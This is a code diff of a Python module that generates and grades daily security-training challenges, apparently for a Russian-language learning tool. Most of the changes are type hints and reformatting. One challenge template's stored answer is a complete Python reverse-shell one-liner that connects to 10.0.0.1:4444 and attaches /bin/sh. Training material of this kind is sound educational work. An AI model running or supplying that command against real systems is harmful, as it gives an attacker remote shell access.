@@ -4,17 +4,27 @@ import json
 import os
 import random
 from datetime import UTC, date, datetime, timedelta
-from typing import Any
+from typing import Any, Callable
 
 from rich.panel import Panel
 
 from ui import console
 
-CHALLENGE_FILE = "./memory/daily_challenges.json"
+
+def _challenge_file() -> str:
+    try:
+        from settings import get_settings
+
+        return str(get_settings().daily_challenge_file)
+    except ImportError:
+        return "./memory/daily_challenges.json"
+
+
+CHALLENGE_FILE = _challenge_file()
 
 DIFFICULTIES = ["easy", "medium", "hard"]
 
-CHALLENGE_TEMPLATES = {
+CHALLENGE_TEMPLATES: dict[str, list[dict[str, Any]]] = {
     "easy": [
         {
             "title": "Base64 детектив",
@@ -101,7 +111,7 @@ CHALLENGE_TEMPLATES = {
             "title": "Reverse Shell",
             "desc": "Напиши Python one-liner для обратного shell на 10.0.0.1:4444.",
             "payload_gen": lambda: "",
-            "answer": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+            "answer": 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
             "hint": "socket + os.dup2 + subprocess",
         },
         {
@@ -122,13 +132,14 @@ CHALLENGE_TEMPLATES = {
 }
 
 
-def _load_challenges() -> dict:
+def _load_challenges() -> dict[str, Any]:
     """Загрузить историю челленджей."""
     if os.path.exists(CHALLENGE_FILE):
         try:
             with open(CHALLENGE_FILE, "r", encoding="utf-8") as f:
-                return json.load(f)
-        except Exception:
+                result: dict[str, Any] = json.load(f)
+                return result
+        except (OSError, IOError, json.JSONDecodeError):
             pass
     return {"history": {}, "streak": 0, "last_date": None, "best_streak": 0}
 
@@ -154,7 +165,8 @@ def generate_daily_challenge(difficulty: str | None = None) -> dict[str, Any]:
     today = _get_today_str()
 
     if today in data.get("history", {}):
-        return data["history"][today]
+        result: dict[str, Any] = data["history"][today]
+        return result
 
     if difficulty is None:
         difficulty = random.choice(DIFFICULTIES)
@@ -187,7 +199,11 @@ def submit_daily_answer(user_answer: str) -> dict[str, Any]:
     challenge = data.get("history", {}).get(today)
 
     if not challenge:
-        return {"correct": False, "feedback": "Челлендж ещё не сгенерирован. Используй /daily", "xp_reward": 0}
+        return {
+            "correct": False,
+            "feedback": "Челлендж ещё не сгенерирован. Используй /daily",
+            "xp_reward": 0,
+        }
 
     user_lower = user_answer.strip().lower()
     answer_lower = challenge["answer"].lower()
@@ -213,7 +229,13 @@ def submit_daily_answer(user_answer: str) -> dict[str, Any]:
 def _extract_keywords(answer: str) -> list[str]:
     """Извлечь ключевые слова из ответа для частичной проверки."""
     # Убираем короткие слова и спецсимволы
-    words = answer.replace("'", "").replace('"', "").replace("(", "").replace(")", "").split()
+    words = (
+        answer.replace("'", "")
+        .replace('"', "")
+        .replace("(", "")
+        .replace(")", "")
+        .split()
+    )
     return [w for w in words if len(w) > 2]
 
 
@@ -264,7 +286,9 @@ def _handle_correct(data: dict, challenge: dict) -> dict[str, Any]:
     }
 
 
-def _handle_partial(data: dict, challenge: dict, matched: int, total: int) -> dict[str, Any]:
+def _handle_partial(
+    data: dict, challenge: dict, matched: int, total: int
+) -> dict[str, Any]:
     """Обработка частичного ответа."""
     return {
         "correct": False,
@@ -306,5 +330,6 @@ def get_hint() -> str:
     today = _get_today_str()
     challenge = data.get("history", {}).get(today)
     if challenge:
-        return challenge.get("hint", "Подсказка недоступна")
+        result: str = challenge.get("hint", "Подсказка недоступна")
+        return result
     return "Челлендж ещё не сгенерирован"
